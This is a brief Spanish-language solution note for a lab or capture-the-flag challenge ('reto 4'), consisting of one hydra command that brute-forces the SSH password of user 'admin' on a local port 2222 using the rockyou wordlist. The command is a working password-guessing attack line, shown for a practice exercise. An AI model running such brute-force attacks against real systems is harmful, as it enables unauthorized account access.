# Solucion para el reto 4

## Comando utilizado para la obtencion de la contraseña del usuario admim

```bash
hydra -s 2222 -l admin -P /usr/share/wordlists/rockyou.txt -e nsr -t 8 ssh://127.0.0.1 -v -f

```


